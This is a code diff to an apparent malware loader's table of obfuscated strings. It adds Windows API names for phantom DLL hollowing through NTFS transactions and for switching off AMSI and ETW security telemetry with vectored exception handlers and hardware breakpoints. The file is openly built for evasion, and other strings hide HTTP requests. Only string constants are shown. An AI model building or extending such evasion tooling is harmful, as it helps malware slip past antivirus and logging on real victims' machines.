@@ -36,8 +36,19 @@ OBFUSCATED_STRINGS = {
     "XSTR_INTERNET_QUERY_OPTION_A": "InternetQueryOptionA",
     "XSTR_USER_AGENT":              "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
     "XSTR_HTTP_GET":                "GET",
-    # Stomper.c (sacrificial DLL for module stomping)
+    # Stomper.c (sacrificial DLL for module stomping / phantom hollowing)
     "XSTR_STOMP_DLL":               "msftedit.dll",
+    # Evasion.c (patchless AMSI/ETW via VEH + hardware breakpoints)
+    "XSTR_RTL_ADD_VEH":             "RtlAddVectoredExceptionHandler",
+    "XSTR_NT_CONTINUE":             "NtContinue",
+    "XSTR_RTL_CAPTURE_CTX":         "RtlCaptureContext",
+    # Stomper.c (phantom DLL hollowing via NTFS transactions)
+    "XSTR_KTMW32_DLL":              "ktmw32.dll",
+    "XSTR_CREATE_TRANSACTION":      "CreateTransaction",
+    "XSTR_CREATE_FILE_TXA":         "CreateFileTransactedA",
+    "XSTR_ROLLBACK_TRANSACTION":    "RollbackTransaction",
+    "XSTR_KERNEL32_DLL":            "kernel32.dll",
+    "XSTR_SYS32_PREFIX":            "C:\\Windows\\System32\\",
 }
 
 
